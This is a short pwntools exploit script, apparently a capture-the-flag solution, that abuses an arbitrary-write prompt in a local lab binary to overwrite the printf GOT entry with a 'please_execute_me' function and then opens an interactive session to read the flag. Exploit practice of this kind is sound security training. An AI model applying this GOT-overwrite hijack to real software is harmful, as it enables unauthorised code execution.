#!/usr/bin/env python
#@author: Ramin Nourbakhsh

from pwn import *

context.arch = "amd64"

e = ELF("./6-aw0-64")

got_printf = e.got['printf']

plz_exec_me_addr = e.symbols['please_execute_me']  
log.info(f"this is the address for please_exec_me: {p32(plz_exec_me_addr)}")

p = e.process()

#This function will read your input for N bytes and then write them to an address A.
print(p.recvline())

#64 bit so we want 8 bytes
p.sendline(b'8')

#how many bytes do you want to read?
print(p.recvline())

#we want to overwrite the got_printf address 
p.sendline(hex(got_printf))

#What is the address that you want to write (A, in hexadexmial, e.g., 0xffffde01)?
print(p.recvline())

#this is the address that we want insted of got_printf
p.sendline(p64(plz_exec_me_addr))

p.interactive()
#run cat flag
